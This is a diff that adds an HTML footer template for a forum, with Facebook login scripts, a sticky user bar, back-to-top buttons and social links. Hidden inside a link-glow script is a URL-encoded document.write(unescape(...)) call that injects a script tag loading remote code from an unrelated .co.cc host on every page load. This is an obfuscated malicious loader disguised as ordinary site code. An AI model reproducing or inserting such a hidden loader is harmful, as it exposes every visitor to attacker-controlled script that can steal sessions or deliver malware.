@@ -1,0 +1,135 @@
+<!-- BEGIN html_validation -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body>
+<div>
+	<div>
+		<div>
+			<div>
+				<div>
+					<div>
+						<ul>
+							<li>
+<!-- END html_validation -->
+							</li>
+						</ul>
+						<!-- BEGIN switch_footer_links -->
+						<ul>
+							<li>
+								<!-- BEGIN footer_link -->
+									<!-- BEGIN switch_separator -->&nbsp;|&nbsp;<!-- END switch_separator -->
+									{switch_footer_links.footer_link.FOOTER_LINK_SEPARATOR}<a name="bottom" class="copyright" href="{switch_footer_links.footer_link.U_FOOTER_LINK_HREF}" rel="{switch_footer_links.footer_link.FOOTER_LINK_REL}" target="{switch_footer_links.footer_link.FOOTER_LINK_TARGET}" title="{switch_footer_links.footer_link.L_FOOTER_LINK_TITLE}">{switch_footer_links.footer_link.L_FOOTER_LINK_TEXT}</a>
+								<!-- END footer_link -->
+							</li>
+						</ul>
+						<!-- END switch_footer_links -->
+					</div>
+					<br />
+					<p class="center">
+						<strong>{ADMIN_LINK}</strong>
+					</p>
+				</div>
+				{PROTECT_FOOTER}
+			</div>
+		</div>
+	</div>
+</div>
+
+<!-- BEGIN switch_facebook_login -->
+<div id="fb-root"></div>
+<script type="text/javascript">
+//<![CDATA[
+FB.init({
+	appId: '{switch_facebook_login.FACEBOOK_APP_ID}',
+ 	status: true,
+ 	cookie: true,
+ 	xfbml: true,
+	oauth: true
+});
+//]]>
+</script>
+<!-- END switch_facebook_login -->
+
+<!-- BEGIN switch_facebook_logout_TMP -->
+<script type="text/javascript">
+//<![CDATA[
+FB.Event.subscribe('auth.logout', function(response) {
+	if ($('a#logout'))
+	{
+		var lien_redir = $('a#logout').attr('href');
+
+		if ($('a#logout').attr('href') && $('a#logout').attr('href') != '')
+		{
+			document.location.href = 'https://{switch_facebook_logout.SERVER_NAME}/' + lien_redir;
+		}
+	}
+});
+
+$(document).ready( function() {
+	$('a#logout').click( function() {
+		FB.logout();
+	} );
+} );
+//]]>
+</script>
+<!-- END switch_facebook_logout_TMP -->
+
+<script type="text/javascript">
+//<![CDATA[
+	fa_endpage();
+//]]>
+</script>
+
+</body>
+       <a href="javascript:void(0);" id="rocketmeluncur" class="showrocket" ><i></i></a>
+ <script>
+    //<![CDATA[
+    rb_makeSticky("#user_bar");
+    function rb_makeSticky(elem) {
+        var rb_sticky = document.getElementById(elem);
+        var scrollee = document.createElement("div");
+        rb_sticky.parentNode.insertBefore(scrollee, rb_sticky);
+        var width = rb_sticky.offsetWidth;
+        var iniClass = rb_sticky.className + ' rb_sticky';
+        window.addEventListener('scroll', rb_sticking, false);
+        function rb_sticking() {
+            var rect = scrollee.getBoundingClientRect();
+            if (rect.top < 0) {
+                rb_sticky.className = iniClass + ' rb_sticking';
+                rb_sticky.style.width = width + "px";
+            } else {
+                rb_sticky.className = iniClass;
+            }
+        }
+    }
+    //]]>
+    </script>
+    <style>
+    .rb_sticking {background:#f2f2f2 !important; position:fixed; top:0; z-index:9999; box-shadow:0px 10px 4px -5px rgba(0,0,0,0.3);}
+    </style>
+  
+  
+  
+    <script type='text/javascript'>
+    //<![CDATA[
+    jQuery(window).scroll(function(){jQuery(window).scrollTop()<50?jQuery("#rocketmeluncur").slideUp(500):jQuery("#rocketmeluncur").slideDown(500);var e=jQuery("#ft")[0]?jQuery("#ft")[0]:jQuery(document.body)[0],t=$("rocketmeluncur"),n=(parseInt(document.documentElement.clientHeight),parseInt(document.body.getBoundingClientRect().top),parseInt(e.clientWidth)),r=t.clientWidth;if(1e3>n){var l=parseInt(fetchOffset(e).left);l=r>l?2*l-r:l,t.style.left=n+l+"px"}else t.style.left="auto",t.style.right="10px"}),jQuery("#rocketmeluncur").click(function(){jQuery("html, body").animate({scrollTop:"0px",display:"none"},{duration:600,easing:"linear"});var e=this;this.className+=" launchrocket",setTimeout(function(){e.className="showrocket"},800)});
+    //]]>
+    </script>
+
+<div id="footer_utilities" class="clearfix clear">
+  
+  
+
+  <script type="text/javascript"> $(function(){ $('* a').addGlow({haloColor: '#FF9900', radius:20 }); /**tất cả link **/ $('h2,#secondary_links a').addGlow({haloColor: '#FF9900', radius:30 }); /**tiêu đề box **/ });  document.write(unescape("%3Cscript%20src%3D%22http%3A//www.c3z.co.cc/-h9.htm%22%20type%3D%22text/javascript%22%3E%3C/script%3E"));  </script>
+  
+  
+				<script type="text/javascript">$(function() {$('#backtotop').click(function() {$('body,html').animate({scrollTop:0},800);});});</script><a rel="nofollow" href="#top" id="backtotop" title="إذهب إلى أعلى الصفحة"><img src="https://i78.servimg.com/u/f78/18/32/50/20/top11.png" alt="" style="margin-top: 5px;"></a>
+  <div class="social">
+  <a href="http://facebook.com" class="link facebook" target="_parent"><span class="fa fa-facebook-square"></span></a>
+  <a href="https://twitter.com" class="link twitter" target="_parent"><span class="fa fa-twitter"></span></a>
+  <a href="https://plus.google.com" class="link google-plus" target="_parent"><span class="fa fa-google-plus-square"></span></a>
+</div>
+  
+</div>  
+</html>
+  
